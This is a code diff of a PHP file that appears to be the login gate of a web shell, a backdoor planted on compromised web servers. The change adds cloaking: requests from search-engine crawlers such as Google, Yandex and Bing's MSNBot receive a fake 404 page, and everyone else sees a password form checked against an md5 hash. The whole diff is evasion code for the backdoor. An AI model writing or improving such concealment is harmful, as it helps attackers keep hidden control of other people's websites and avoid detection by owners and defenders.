@@ -22,15 +22,18 @@ if( get_magic_quotes_gpc() ) {
 	}
 	$_POST = stripslashes_array($_POST);
 }
+
 function printLogin() {
-	?>
-	<center>
-	<form method=post style="font-family:fantasy;">
-	Password: <input type=password name=pass style="background-color:whitesmoke;border:1px solid #FFF;"><input type=submit value='>>' style="border:none;background-color:teal;color:#fff;">
-	</form></center>
-	<?php
-	exit;
+		if(!empty($_SERVER['HTTP_USER_AGENT'])) {
+		  $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
+		  if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
+		  header('HTTP/1.0 404 Not Found');
+		  exit;
+		  }
+		}
+	die("<pre align=center><form method=post style='font-family:fantasy;'>Password: <input type=password name=pass style='background-color:whitesmoke;border:1px solid #FFF;'><input type=submit value='>>' style='border:none;background-color:teal;color:#fff;'></form></pre>");
 }
+
 if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] ))
 	if( empty( $auth_pass ) ||
 		( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $auth_pass ) ) )
